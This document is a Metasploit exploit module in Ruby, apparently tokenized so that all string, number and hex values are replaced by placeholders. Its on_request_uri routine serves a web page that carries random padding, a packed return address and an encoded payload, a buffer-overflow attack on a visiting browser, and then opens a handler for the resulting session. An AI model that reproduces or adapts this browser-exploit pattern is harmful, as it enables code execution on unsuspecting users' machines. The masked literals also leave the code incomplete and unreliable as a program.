require <str> class Metasploit3 < Msf :: Exploit :: Remote Rank = NormalRanking include Msf :: Exploit :: Remote :: HttpServer :: HTML def initialize ( info = { } ) super ( update_info ( info , <str> = > <str> , <str> = > <str> , <str> = > MSF_LICENSE , <str> = > [ <str> ] , <str> = > [ [ <str> , <str> ] , [ <str> , <str> ] , [ <str> , <str> ] , ] , <str> = > { <str> = > <str> , } , <str> = > { <str> = > <int> , <str> = > <str> , <str> = > - <int> , } , <str> = > <str> , <str> = > [ [ <str> , { <str> = > <int> , <str> = > <hex> } ] , ] , <str> = > <str> , <str> = > <int> ) ) end def autofilter false end def check_dependencies use_zlib end def on_request_uri ( cli , request ) return if ( ( p = regenerate_payload ( cli ) ) == nil ) vname = rand_text_alpha ( rand ( <int> ) + <int> ) strname = rand_text_alpha ( rand ( <int> ) + <int> ) sploit = rand_text_alpha ( target [ <str> ] ) + [ target . ret ] . pack ( <str> ) + p . encoded content = <str> vname <str> vname <str> vname <str> strname <str> sploit <str> vname <str> vname <str> vname <str> strname <str> print_status ( <str> self . name <str> ) send_response_html ( cli , content ) handler ( cli ) end end 
